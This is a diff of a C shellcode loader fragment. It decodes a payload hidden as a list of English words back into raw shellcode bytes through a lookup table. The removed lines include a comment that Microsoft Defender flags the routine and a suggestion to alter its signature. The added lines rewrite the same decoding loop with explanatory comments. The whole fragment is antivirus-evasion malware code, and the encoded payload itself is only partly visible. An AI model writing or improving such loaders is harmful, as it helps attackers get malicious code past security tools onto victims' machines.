@@ -5,19 +5,17 @@ unsigned char* t_scode[510] = { "drone","merge","elapse","tango","prune","origin
 unsigned char shellcode[510] = {0};
 int sc_len = sizeof(shellcode);
 
-        printf("Translating shellcode!\n");
-        
-        //for (int sc_index = 0; sc_index < 510; sc_index++);
-        
-        for (int sc_index = 0; sc_index < 510; sc_index++) {
-                // Defender is identifying this translation routine as of 3/28/24
-                // Consider adding a printf, writing to null, or some other routine to change up the signature.
-                for (int tt_index = 0; tt_index <= 255; tt_index++) {
-                        //if (t_table[tt_index] == t_scode[sc_index]) {
-                        if (strcmp(t_table[tt_index], t_scode[sc_index]) == 0) {
-                                shellcode[sc_index] = tt_index;
-                                break;
-                        };
-                };
-        };
+// Print a message to indicate the start of translation
+printf("Translating shellcode!\n");
 
+for (int sc_index = 0; sc_index < sc_len; sc_index++) {
+// The loop attempts to find the original ASCII character for each encoded byte in the shellcode.
+int tt_index = -1; // Initialize translation index as invalid (-1)
+for (int tt_index = 0; tt_index < 256; tt_index++) {
+        if (strcmp(t_table[tt_index], t_scode[sc_index]) == 0) {
+        // If a match is found, translate the shellcode byte and break out of this loop.
+        shellcode[sc_index] = tt_index;
+        break;
+        }
+}
+}
